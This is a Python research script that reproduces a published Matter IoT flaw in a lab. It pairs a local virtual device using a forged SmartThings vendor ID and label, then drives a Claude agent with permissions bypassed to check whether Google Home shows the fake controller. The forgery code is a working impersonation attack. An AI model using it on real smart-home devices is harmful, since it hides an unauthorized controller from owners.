#!/usr/bin/env python3
"""
UMCCI Checker Demo — Flaw Type 4
Untrusted Fabric Information: forged Vendor ID and Label in Google Home.

Based on: "Hidden and Lost Control: on Security Design Risks in
           IoT User-Facing Matter Controller" (NDSS 2025)

Target:    Google Home app + matter.js virtual OnOff device
Agent:     Claude Code SDK (claude_agent_sdk)
GUI:       mobile-mcp (Android automation via ADB)
"""

import asyncio
import re
import subprocess
import sys
import threading
import time
from pathlib import Path

from claude_agent_sdk import query, ClaudeAgentOptions, AssistantMessage, ResultMessage
from claude_agent_sdk.types import TextBlock

# ── Paths ────────────────────────────────────────────────────────────────────
CHIP_TOOL    = "/Users/haoyuli9/Desktop/IoT-Matter/connectedhomeip/out/host/chip-tool"
MATTER_DIR   = "/Users/haoyuli9/Desktop/IoT-Matter/matter-devices/device-onoff"
STORAGE_PATH = str(Path(__file__).parent / "storage" / "virtual-device")
MATTER_PORT  = 5542

# ── Flaw Type 4 test parameters ──────────────────────────────────────────────
# chip-tool's local node-ID for the virtual device (arbitrary, avoids collision)
ATTACKER_NODE_ID = 2
# Forge as SmartThings controller (VID 4362, confirmed in paper Table II)
FORGED_VENDOR_ID = 4362
FORGED_LABEL     = "SmartThings Hub"

# ─────────────────────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    print(f"[UMCCI] {msg}", flush=True)


# ── Step 0: Environment check ─────────────────────────────────────────────────

def check_environment() -> None:
    log("=== Environment Check ===")

    result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
    live = [l for l in result.stdout.strip().splitlines()[1:]
            if l.strip() and "offline" not in l]
    if not live:
        sys.exit("ERROR: No Android device detected via ADB. Connect the phone first.")
    log(f"✓ Android device: {live[0].split()[0]}")

    if not Path(CHIP_TOOL).exists():
        sys.exit(f"ERROR: chip-tool not found at {CHIP_TOOL}")
    log("✓ chip-tool found")

    if not Path(MATTER_DIR).exists():
        sys.exit(f"ERROR: matter.js OnOff device not found at {MATTER_DIR}")
    log("✓ matter.js OnOff device found")

    log("Environment check passed.\n")


# ── Step 1: matter.js virtual device ─────────────────────────────────────────

def is_already_commissioned() -> bool:
    """Detect prior commissioning by checking whether storage has data."""
    storage = Path(STORAGE_PATH)
    return storage.exists() and any(storage.rglob("*.json"))


def start_matter_device() -> tuple[subprocess.Popen, str | None]:
    """
    Launch the matter.js virtual OnOff device.
    Returns (proc, pairing_code).  pairing_code is None when already commissioned.
    """
    log("=== Starting matter.js Virtual Device ===")
    Path(STORAGE_PATH).mkdir(parents=True, exist_ok=True)

    proc = subprocess.Popen(
        ["npm", "run", "app", "--",
         f"--port={MATTER_PORT}",
         f"--storage-path={STORAGE_PATH}"],
        cwd=MATTER_DIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    pairing_code: str | None = None
    ready = threading.Event()

    def _reader():
        nonlocal pairing_code
        assert proc.stdout is not None
        for raw in proc.stdout:
            line = raw.rstrip()
            print(f"  [matter.js] {line}")
            m = re.search(r"Manual pairing code:\s*([\d-]+)", line, re.IGNORECASE)
            if m:
                pairing_code = m.group(1).replace("-", "")
                ready.set()
            # Server is up even without a fresh pairing code (already commissioned)
            if any(kw in line.lower() for kw in ["server listening", "commissioned",
                                                   "started", "node started"]):
                ready.set()

    threading.Thread(target=_reader, daemon=True).start()
    ready.wait(timeout=40)
    time.sleep(2)  # extra settling time

    if pairing_code:
        log(f"✓ Pairing code: {pairing_code}")
    else:
        log("Device started without fresh pairing code (already commissioned).")
    return proc, pairing_code


# ── Step 2/3: chip-tool helpers ───────────────────────────────────────────────

def run_chip_tool(*args, timeout: int = 120) -> tuple[int, str]:
    cmd = [CHIP_TOOL] + [str(a) for a in args]
    log(f"  chip-tool {' '.join(str(a) for a in args)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    combined = r.stdout + r.stderr
    if r.returncode != 0:
        log(f"  [chip-tool stderr] {r.stderr[:400]}")
    return r.returncode, combined


def chip_tool_pair_forged(pairing_code: str) -> None:
    """Pair using chip-tool with a forged Vendor ID — this is the Flaw Type 4 attack."""
    log(f"=== Flaw Type 4: Pair with Forged VID={FORGED_VENDOR_ID} (node {ATTACKER_NODE_ID}) ===")
    rc, _ = run_chip_tool(
        "pairing", "code",
        "--commissioner-vendor-id", FORGED_VENDOR_ID,
        ATTACKER_NODE_ID, pairing_code,
        timeout=180,
    )
    if rc != 0:
        raise RuntimeError(f"chip-tool pairing failed (rc={rc})")
    log(f"✓ Paired as node {ATTACKER_NODE_ID} with forged VID={FORGED_VENDOR_ID}")


def chip_tool_set_label(label: str) -> None:
    """Set the fabric label to a forged value on the device."""
    log(f"Setting forged fabric label: '{label}'")
    rc, _ = run_chip_tool(
        "operationalcredentials", "update-fabric-label",
        label, ATTACKER_NODE_ID, 0,
        timeout=30,
    )
    if rc == 0:
        log(f"✓ Fabric label set to '{label}'")
    else:
        log(f"Warning: update-fabric-label rc={rc}; continuing anyway")


def chip_tool_open_commissioning_window() -> str | None:
    """
    Open an Enhanced Commissioning Window via chip-tool.
    Returns the new manual pairing code, or None on failure.
    """
    log("Opening commissioning window for Google Home pairing (ECM)...")
    rc, out = run_chip_tool(
        "pairing", "open-commissioning-window",
        ATTACKER_NODE_ID,  # local node-id of the device in chip-tool's store
        "1",               # option 1 = Enhanced Commissioning Method
        "180",             # window timeout (seconds)
        "1000",            # PBKDF iteration count
        "0",               # discriminator hint (0 → use device's own)
        timeout=40,
    )
    m = re.search(r"Manual pairing code:\s*([\d-]+)", out, re.IGNORECASE)
    if m:
        code = m.group(1).replace("-", "")
        log(f"✓ New pairing code for Google Home: {code}")
        return code
    log(f"Warning: could not extract pairing code from open-commissioning-window output (rc={rc})")
    return None


# ── Step 4/5: Claude agent tasks ──────────────────────────────────────────────

async def run_agent(prompt: str, task_name: str) -> str:
    """
    Run a Claude agent task using the user's Claude Code settings,
    which include the mobile-mcp MCP server for Android GUI automation.
    """
    log(f"=== Agent Task: {task_name} ===")
    opts = ClaudeAgentOptions(
        permission_mode="bypassPermissions",
        setting_sources=["user"],   # inherit mobile-mcp from ~/.claude/settings.json
        max_turns=50,
    )
    parts: list[str] = []
    async for msg in query(prompt=prompt, options=opts):
        if isinstance(msg, AssistantMessage):
            for block in msg.content:
                if isinstance(block, TextBlock) and block.text.strip():
                    preview = block.text[:300].replace("\n", " ")
                    print(f"  [agent] {preview}")
                    parts.append(block.text)
        elif isinstance(msg, ResultMessage):
            cost = f"${msg.total_cost_usd:.4f}" if msg.total_cost_usd else "N/A"
            log(f"Agent task complete (cost: {cost})")
    return "\n".join(parts)


_PAIR_PROMPT = """\
You are a security researcher running an authorized IoT security test in a lab environment.

TASK: Pair Google Home with a virtual Matter device using the pairing code below.

Pairing code: {pairing_code}

Instructions:
1. Take a screenshot to see the current phone screen state.
2. Open Google Home app (package: com.google.android.apps.chromecast.app). If already open, proceed.
3. Add a new device:
   - Tap the "+" / "Add" button (bottom-right or top-right corner).
   - Choose "Set up device" → "New device" (or "Matter-enabled device").
   - When asked to scan a QR code, look for a "Setup without QR code" or "Enter code manually" option.
   - Enter pairing code: {pairing_code}
4. If prompted with "Uncertified device" or "Device not certified by Google", tap "Set up anyway" / "Add anyway".
5. Complete the setup wizard — accept defaults for room assignment and device name.
6. Confirm the device now appears in the Google Home device list.

If the device is already paired (you can see a virtual OnOff Light device in Google Home), report success and skip.

Report what you observe at each key step and whether pairing succeeded."""

_VERIFY_PROMPT = """\
You are a security researcher verifying Matter IoT Flaw Type 4: untrusted fabric information.

Background: An attacker has paired this device using a forged Vendor ID ({forged_vid}) and label \
"{forged_label}". The question is whether Google Home displays this forged information in its UI.

TASK: In Google Home, navigate to the paired virtual Matter device settings and find any section \
that shows connected controllers, linked services, or fabric information.

Instructions:
1. Take a screenshot to see the current screen.
2. Open or navigate to Google Home app.
3. Locate the paired Matter device (look for "node-matter OnOff Light" or similar name).
4. Open the device's detail page (tap on the device tile).
5. Open settings (gear icon or three-dot menu).
6. Navigate through ALL available settings pages and look specifically for:
   - "Linked apps & services"
   - "Connected services"
   - "Share device"
   - Any list of apps, hubs, or services that have access to the device
   - Any Matter or fabric controller information
7. Take a screenshot of each relevant page found.
8. Report the EXACT text shown in any controller/service list — including vendor names, labels, or IDs.

Goal: Determine if Google Home exposes the forged fabric entry \
(Vendor ID={forged_vid}, label="{forged_label}") in its UI.
Be thorough and check every settings sub-page you can find."""


# ── Main orchestration ────────────────────────────────────────────────────────

async def main() -> None:
    print()
    print("=" * 60)
    print(" UMCCI Checker Demo — Flaw Type 4")
    print(" Untrusted Fabric Information (VID & Label Forgery)")
    print("=" * 60)
    print()

    # ── 0. Environment ─────────────────────────────────────────────────────────
    check_environment()

    # ── 1. Start virtual device ────────────────────────────────────────────────
    already_commissioned = is_already_commissioned()
    proc, pairing_code = start_matter_device()

    try:
        if not already_commissioned:
            # ── 2. Fresh device: attack + pairing flow ─────────────────────────
            if pairing_code is None:
                raise RuntimeError(
                    "Fresh storage but no pairing code captured. "
                    "Try deleting the storage directory and rerunning."
                )

            # Attacker pairs first with forged VID
            chip_tool_pair_forged(pairing_code)
            chip_tool_set_label(FORGED_LABEL)

            # Open commissioning window → Google Home pairs second
            new_code = chip_tool_open_commissioning_window()
            google_code = new_code or pairing_code  # ECM preferred; fall back to original

            # Agent: pair Google Home
            await run_agent(
                _PAIR_PROMPT.format(pairing_code=google_code),
                "Pair Google Home with virtual device",
            )

        else:
            # ── 2b. Already commissioned: skip straight to verification ─────────
            log("Storage already exists — skipping pairing phase.")
            log("Forged fabric from previous run is still present on the device.\n")

        # ── 3. Give Google Home a moment to sync ──────────────────────────────
        log("Waiting for Google Home to sync fabric data...")
        time.sleep(5)

        # ── 4. Agent: verify forged fabric info in Google Home UI ──────────────
        result = await run_agent(
            _VERIFY_PROMPT.format(
                forged_vid=FORGED_VENDOR_ID,
                forged_label=FORGED_LABEL,
            ),
            "Verify forged fabric info in Google Home",
        )

        # ── 5. Report ──────────────────────────────────────────────────────────
        print()
        print("=" * 60)
        print(" FLAW TYPE 4 — TEST REPORT")
        print("=" * 60)
        print(f"  Forged Vendor ID : {FORGED_VENDOR_ID}  (impersonating SmartThings)")
        print(f"  Forged Label     : {FORGED_LABEL}")
        print()
        print("Verification findings (from agent):")
        print("-" * 40)
        print(result)
        print("=" * 60)

    finally:
        log("Stopping matter.js device...")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


if __name__ == "__main__":
    asyncio.run(main())
